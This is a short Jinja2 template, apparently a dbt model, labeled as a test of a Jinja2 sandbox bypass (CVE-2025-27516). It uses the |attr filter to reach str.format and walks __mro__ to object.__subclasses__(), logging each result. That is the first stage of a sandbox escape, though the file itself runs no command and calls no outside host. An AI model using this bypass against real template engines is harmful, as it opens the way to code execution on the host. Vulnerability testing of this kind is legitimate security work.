{# CVE-2025-27516: Jinja2 |attr filter sandbox bypass #}
{# Test 1: Get format reference via attr #}
{% set fmt_ref = '{0.__class__.__mro__}'|attr('format') %}
{{ log("FMT_REF=" ~ (fmt_ref | string), info=True) }}

{# Test 2: Call format to resolve MRO #}
{% set bypass = fmt_ref('') %}
{{ log("BYPASS_MRO=" ~ (bypass | string), info=True) }}

{# Test 3: Get subclasses #}
{% set fmt2 = '{0.__class__.__mro__[1].__subclasses__()}'|attr('format') %}
{% set subs = fmt2('') %}
{{ log("BYPASS_SUBS_COUNT=" ~ (subs | length), info=True) }}

SELECT 1 as id
